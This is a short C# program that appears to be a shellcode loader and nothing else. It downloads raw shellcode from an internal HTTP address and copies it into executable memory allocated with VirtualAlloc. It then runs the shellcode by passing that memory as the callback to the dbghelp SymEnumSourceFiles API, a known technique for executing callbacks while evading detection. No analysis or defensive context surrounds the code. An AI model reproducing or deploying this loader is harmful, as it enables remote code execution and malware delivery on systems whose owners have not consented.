using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SysEnumSourceFiles
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr hProcess = GetCurrentProcess();

            SymInitialize(hProcess, null, true);

            SymEnumSourceFiles(hProcess, 0, null, addr, IntPtr.Zero);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("dbghelp.dll")]
        static extern bool SymInitialize(IntPtr hProcess, String UserSearchPath, bool fInvadeProcess);

        [DllImport("dbghelp.dll")]
        static extern bool SymEnumSourceFiles(IntPtr hProcess, ulong ModBase, String Mask, IntPtr cbSrcFiles, IntPtr UserContext);
    }
}

